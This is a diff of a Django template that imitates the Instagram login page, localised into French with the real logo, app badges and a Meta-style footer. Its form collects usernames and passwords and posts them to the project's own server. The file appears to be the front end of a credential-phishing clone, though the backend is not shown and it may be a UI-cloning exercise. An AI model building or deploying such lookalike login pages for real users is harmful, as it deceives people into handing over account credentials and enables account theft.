@@ -1,127 +1,59 @@
 <!DOCTYPE html>
+{% load static %}
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fafafa;
-        }
-        
-        .login-container {
-            background: white;
-            padding: 40px;
-            margin-top: 0px;
-            width: 350px;
-            border-radius: 5px;
-            text-align: center;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-        }
-        
-        .brand {
-            font-family: 'Brush Script MT', cursive;
-            font-size: 40px;
-            margin-bottom: 20px;
-        }
-        
-        form {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 3px;
-        }
-        
-        .login-btn {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 10px;
-            font-size: 16px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
-        .login-btn:hover {
-            background-color: #007ac6;
-        }
-        
-        .separator {
-            margin: 15px 0;
-            color: #777;
-        }
-        
-        .facebook-login {
-            background-color: white;
-            color: #0095f6;
-            border: none;
-            padding: 10px;
-            font-size: 16px;
-            border-radius: 3px;
-            cursor: pointer;
-            width: 100%;
-        }
-        
-        .forgot-password {
-            display: block;
-            margin-top: 10px;
-            color: #0095f6;
-            text-decoration: none;
-        }
-        
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-        
-        .signup-text {
-            margin-top: 20px;
-            color: #777;
-        }
-        
-        .signup-text a {
-            color: #0095f6;
-            text-decoration: none;
-        }
-        
-        .signup-text a:hover {
-            text-decoration: underline;
-        }        
-    </style>
+    <title>Connexion • Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="{% static './style.css' %}">
 </head>
 <body>
-    <div class="login-container">
-        <h1 class="brand">Instagram</h1>
-        <form method="post">
-            {% csrf_token %}
-            
-            <input type="text" name="{{ form.username.name }}" placeholder="{{ form.username.field.widget.attrs.placeholder }}" required>
-            
-            <input type="password" name="{{ form.password.name }}" placeholder="{{ form.password.field.widget.attrs.placeholder }}" required>
-            
-            <button type="submit" class="login-btn">Log in</button>
-        </form>
-        <div class="separator">OR</div>
-        <button class="facebook-login">Log in with Facebook</button>
-        <a href="#" class="forgot-password">Forgot password?</a>
-        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
-    </div>
+    <main class="main">
+        <div class="login-container">
+            <h1 class="brand"><img src="{% static 'assets/logo.svg' %}" alt="Instagram"></h1>
+            <form method="post">
+                {% csrf_token %}
+                
+                <input type="text" name="{{ form.username.name }}" placeholder="{{ form.username.field.widget.attrs.placeholder }}" required>
+                
+                <input type="password" name="{{ form.password.name }}" placeholder="{{ form.password.field.widget.attrs.placeholder }}" required>
+                
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>
+            <div class="separator"><div>OU</div></div>
+            <button class="facebook-login"><i class="fa-brands fa-facebook icon-facebook"></i><p>Se connecter avec facebook</p></button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </div>
+        <div class="signup-container">
+            <p class="signup-text">Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+        </div>
+        <div class="download-container">
+            <h3>Téléchargez l'application.</h3>
+            <div class="download-icon-box">
+                <img class="download-icon" src="{% static 'assets/googleplay.png' %}"/>
+                <img class="download-icon" src="{% static 'assets/windows.png' %}"/>
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <div class="footer-item">Meta</div>
+        <div class="footer-item">À propos</div>
+        <div class="footer-item">Blog</div>
+        <div class="footer-item">Emplois</div>
+        <div class="footer-item">Aide</div>
+        <div class="footer-item">API</div>
+        <div class="footer-item">Confidentialité</div>
+        <div class="footer-item">Conditions</div>
+        <div class="footer-item">Lieux</div>
+        <div class="footer-item">Instagram Lite</div>
+        <div class="footer-item">Threads</div>
+        <div class="footer-item">Importation des contacts et non-utilisateurs</div>
+        <div class="footer-item">Meta Verified</div>
+        <div class="footer-item-copyright" >&copy; 2025 Instagram par Meta</div>
+    </footer>
+    
+    
+    
 </body>
 </html>
